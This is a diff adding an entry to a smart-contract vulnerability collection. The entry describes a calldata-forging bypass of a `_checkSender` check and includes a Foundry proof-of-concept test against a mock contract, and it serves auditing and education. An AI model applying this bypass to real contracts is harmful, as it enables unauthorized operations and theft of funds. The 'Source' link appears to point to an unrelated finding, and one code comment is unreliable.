@@ -338,3 +338,49 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 7. IMarket.execute.selector, `_checkSender` bypass allows to execute arbitrary operations
+
+### Forge calldata by length
+
+- Summary: An incorrect interpretation of calldata for the execute signature allows bypassing the `_checkSender` function, so that an attacker can forge it to match the value of a whitelisted or specially generated address by manipulating the length of calldata.
+
+- Impact & Recommendation: Address the incorrect interpretation of calldata to prevent bypassing security checks and unauthorized execution in the market contract.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-tapioca#m-08-incorrect-return-value-of-function-basetapiocaomnichainengine_paynative) & [Report](https://code4rena.com/reports/2024-02-tapioca)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity 0.8.22;
+    import {Test} from "forge-std/Test.sol";
+    import {console2} from "forge-std/console2.sol";
+    contract MockCallerChecker {
+    function doTheCheck(bytes calldata _actionCalldata) external {
+        console2.log("Calldata Length", _actionCalldata.length);
+        _checkSender(abi.decode(_actionCalldata[4:36], (address)));
+    }
+    function _checkSender(address entry) internal {
+        console2.log("msg.sender", msg.sender);
+        console2.log("entry", entry);
+        require(msg.sender == entry);
+    }
+    }
+    contract BasicTest is Test {
+        // 4 bytes is funsig 0xaaaaaaaa
+        // 32 bytes are the address (since abi.encoding uses a full word)
+        // 0000000000000000000000000000000000000000111111111111111111111111
+        bytes data = hex"aaaaaaaa0000000000000000000000000000000000000000111111111111111111111111";
+        function testDemo() public {
+        MockCallerChecker checker = new MockCallerChecker();
+        console2.log(data.length);
+        // Same address as the length
+        vm.prank(address(0x111111111111111111111111));
+        checker.doTheCheck(data);
+        // For a real exploit, all we have to do is find the cheapest between available addresses and one we can mine
+        }
+    }
+
+  ```
+
+  </details>
